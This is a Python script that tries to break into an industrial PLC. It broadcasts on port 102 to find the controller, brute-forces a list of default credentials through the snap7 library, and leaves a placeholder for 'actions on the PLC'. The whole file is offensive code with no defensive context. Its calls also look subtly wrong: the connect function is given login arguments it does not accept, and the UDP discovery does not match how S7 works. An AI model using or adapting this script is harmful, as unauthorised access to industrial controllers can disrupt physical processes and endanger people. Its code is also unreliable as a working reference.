import socket
import struct
import snap7
import scapy.all as scapy

# Define the PLC's IP address and port
plc_ip = None
plc_port = 102

# Define the default credentials
default_credentials = [
    {"username": "admin", "password": "password"},
    {"username": "root", "password": "root"},
    {"username": "default", "password": "default"},
    # Add more default credentials as needed
]

# Function to scan the network for the PLC's IP address
def find_plc_ip():
    global plc_ip
    # Send a broadcast message to the network to find the PLC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Hello, PLC!", ("255.255.255.255", plc_port))
    # Listen for a response from the PLC
    sock.settimeout(1)
    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP address {plc_ip}")
    except socket.timeout:
        print("No PLC found on the network")
    sock.close()

# Function to attempt to use default credentials to access the PLC
def attempt_default_credentials():
    global plc_ip
    if plc_ip is not None:
        # Create a client object
        client = snap7.S7Client()
        # Attempt to connect to the PLC using default credentials
        for credentials in default_credentials:
            try:
                client.ConnectTo(plc_ip, 0, 1, credentials["username"], credentials["password"])
                print(f"Successfully connected to PLC using credentials {credentials['username']}:{credentials['password']}")
                # Perform actions on the PLC as needed
                client.Disconnect()
                return
            except Exception as e:
                print(f"Failed to connect to PLC using credentials {credentials['username']}:{credentials['password']}: {e}")
        print("Failed to connect to PLC using default credentials")
    else:
        print("PLC IP address not found")

# Main function
def main():
    find_plc_ip()
    attempt_default_credentials()

if __name__ == "__main__":
    main()